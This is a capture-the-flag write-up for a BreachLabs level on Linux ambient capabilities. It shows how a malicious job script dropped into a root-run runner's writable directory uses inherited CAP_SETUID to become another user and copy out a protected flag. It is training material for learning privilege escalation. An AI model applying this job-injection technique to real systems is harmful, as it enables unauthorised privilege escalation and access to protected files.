# BreachLabs: Ghost Track II Level 03 - Ambient Ambitions

**Challenge:** Level 03  
**Date Completed:** September 1, 2026  
**Platform:** [BreachLabs](https://breachlab.org)

---

## Summary

Ambient Ambitions introduces ambient and inheritable capabilities as privilege escalation vectors. The challenge requires exploiting a scheduled runner that inherits ambient capabilities and executes user-provided jobs, allowing code injection with elevated privileges. Success demonstrates understanding of capability inheritance, process wrapping, and how ambient capabilities leak to child processes.

---

## Challenge Objective

**Goal:** Become the ops service account and read `/var/lib/ops/.flag`  
**Context:** A root-running job scheduler executes jobs from a builder-writable directory with inherited capabilities  
**Constraint:** Must inject code into the runner's job directory and wait for scheduled execution

---

## Initial Access

### Builder User Access

Maintained builder user context from Level 02.

---

## Challenge Brief

### Home Directory Review

Listed builder home directory:

```bash
ls -alps
```

**Directory Contents:**
```
4 drwxr-x--- 1 builder builder 4096 Sep  1 14:36 ./
8 drwxr-xr-x 1 root    root    4096 Aug 22 16:14 ../
4 -rw-r--r-- 1 builder builder  220 Jan  6  2022 .bash_logout
4 -rw-r--r-- 1 builder builder 3771 Jan  6  2022 .bashrc
4 -rw------- 1 builder builder   39 Sep  1 14:36 .flag
4 -rw-r--r-- 1 builder builder  807 Jan  6  2022 .profile
4 -rw------- 1 builder builder  926 Aug 22 16:14 kael.txt
```

**Finding:** Located challenge briefing in kael.txt.

### Challenge Briefing

Read the challenge instructions:

```bash
cat kael.txt
```

**Challenge Content:**
```
[ KAEL // fragment 3 ]
Builder can write into the runner's work directory. Small thing, until you
notice the runner does not start clean. Its wrapper hands capabilities down
to whatever it launches, and it launches whatever you leave in that
directory. The name for this is ambient capabilities, and most people
running it have no idea it is switched on. Leave something behind, let the
runner carry your power for you, and step up. And understand what you are
really holding. A capability that changes your user can change it to any
user, root included. This box is yours now.

  OBJECTIVE   Become the ops service account and read /var/lib/ops/.flag.
  SKILL       Ambient and inheritable capabilities, the part tutorials skip.
  START HERE  Read what the wrapper sets before it execs. getpcaps on the
              running child shows which capability leaked into it. Then get
              your own code into that child.
```

**Finding:** Challenge indicates:
- Builder can write to runner's work directory
- Runner doesn't start clean (inherits capabilities)
- Wrapper passes capabilities to child processes
- Ambient capabilities are the exploit vector
- Must inject code into job directory

---

## Runner Discovery

### Job Runner Script Examination

Examined the job runner loop script:

```bash
cat /usr/local/bin/hal-runner-loop
```

**Script Content:**
```bash
#!/usr/bin/env bash
# HALCYON job runner. Runs as root, every 30s executes each job dropped into
# /opt/hal-runner/jobs via hal-runner-wrap (which runs it as builder with
# CAP_SETUID in the ambient set). This is a plain loop, not a systemd unit.
set -uo pipefail
JOBS=/opt/hal-runner/jobs
while true; do
  for job in "${JOBS}"/*; do
    [ -f "${job}" ] && [ -x "${job}" ] || continue
    /usr/local/bin/hal-runner-wrap "${job}" >/dev/null 2>&1 || true
  done
  sleep 30
done
```

**Key Findings:**
- Runs as root in continuous loop
- Executes every 30 seconds
- Processes executables from `/opt/hal-runner/jobs`
- Uses `hal-runner-wrap` to execute jobs
- hal-runner-wrap runs as builder with `CAP_SETUID` in ambient set
- Ambient capabilities are inherited by child processes

---

## Code Injection

### Job Script Creation

Created malicious job script in runner directory:

```bash
cat > /opt/hal-runner/jobs/ops-job.sh <<'EOF'
#!/bin/bash
/usr/bin/python3 -c '
import os
os.setuid(1002)
with open("/var/lib/ops/.flag") as src:
    flag = src.read()
with open("/tmp/ops-flag", "w") as dst:
    dst.write(flag)
'
EOF
```

**Script Functionality:**
- Uses Python to change effective UID to 1002 (ops user)
- Leverages inherited `CAP_SETUID` capability from wrapper
- Reads `/var/lib/ops/.flag` with ops privileges
- Writes flag to `/tmp/ops-flag` for retrieval

**Finding:** Script will be executed by wrapper with ambient capabilities.

### Executable Permissions

Made script executable:

```bash
chmod +x /opt/hal-runner/jobs/ops-job.sh
```

**Finding:** Script now matches runner's execution criteria (file exists and executable).

---

## Flag Retrieval

### Scheduled Execution

Waited for runner to execute the injected job:

```bash
rm -f /tmp/ops-flag
sleep 35
```

**Reasoning:** Runner executes every 30 seconds; 35-second wait ensures job execution.

### Flag Reading

Retrieved the flag written by the job:

```bash
cat /tmp/ops-flag
```

**Output:**
```
[REDACTED_FLAG]
```

**Finding:** Successfully retrieved flag through ambient capability inheritance and code injection.

---

## Attack Chain Summary

```
Builder User Access (from Level 02)
         ↓
Challenge Brief Discovery (kael.txt)
         ↓
Challenge Context (ambient capabilities in runner)
         ↓
Job Runner Script Analysis (hal-runner-loop)
         ↓
Job Directory Identification (/opt/hal-runner/jobs)
         ↓
Ambient Capability Discovery (CAP_SETUID in wrapper)
         ↓
Malicious Job Creation (ops-job.sh)
         ↓
UID Change Logic (os.setuid(1002))
         ↓
File Access Implementation (read ops .flag)
         ↓
Output Redirection (write to /tmp/ops-flag)
         ↓
Executable Permissions (chmod +x)
         ↓
Scheduled Execution Wait (30s runner + buffer)
         ↓
Ambient Capability Inheritance (to child process)
         ↓
UID Escalation to ops (1002)
         ↓
Flag File Access
         ↓
Flag Retrieval 
         ↓
Challenge Complete
```

---

## Key Techniques & Concepts

1. **Ambient Capabilities** — Capabilities inherited by child processes automatically
2. **Inheritable Capabilities** — Set of capabilities passed to exec'd processes
3. **Capability Inheritance Chain** — Root → wrapper → builder → child inherits CAP_SETUID
4. **Job Injection** — Placing code in scheduler's job directory for automatic execution
5. **Scheduled Execution** — Cron-like 30-second loop ensures code runs with elevated context
6. **os.setuid() Function** — Python function changes process UID using inherited capability
7. **File Access Through Escalation** — Temporary UID change allows reading ops-only files
8. **Output Redirection** — Writing to world-writable location allows flag retrieval

---

## Tools & Commands Used

```bash
# List home directory
ls -alps

# Read challenge briefing
cat kael.txt

# Examine runner script
cat /usr/local/bin/hal-runner-loop

# Create job script
cat > /opt/hal-runner/jobs/ops-job.sh <<'EOF'
...
EOF

# Make executable
chmod +x /opt/hal-runner/jobs/ops-job.sh

# Clean previous runs
rm -f /tmp/ops-flag

# Wait for execution
sleep 35

# Read flag
cat /tmp/ops-flag
```

---

## Lessons Learned

1. **Ambient Capability Risks** — Inherited capabilities provide unintended privilege to child processes
2. **Scheduler Job Directories** — Writable job directories enable code injection
3. **Privilege Inheritance** — Capabilities flow from parent to child without explicit granting
4. **Setuid Alternative** — CAP_SETUID capability allows arbitrary UID changes
5. **Root Context Execution** — Root-running schedulers with ambient capabilities are critical
6. **File Access Escalation** — Temporary UID changes leverage capability-based access
7. **Capability Scope** — CAP_SETUID can escalate to any user, not just root
8. **Scheduled Code Execution** — Background runners provide covert execution mechanism

---

## References

- BreachLabs: [Ghost Track II Series](https://breachlab.org)
- Linux Capabilities: Manual pages for capabilities(7)
- Process Capabilities: Manual pages for getpcaps(1)

---

**Status:** ✅ Completed  
**Challenge Type:** Ambient Capability Exploitation & Code Injection  
**Key Learning:** Exploiting inherited ambient capabilities through scheduled job injection to change user context and access restricted resources
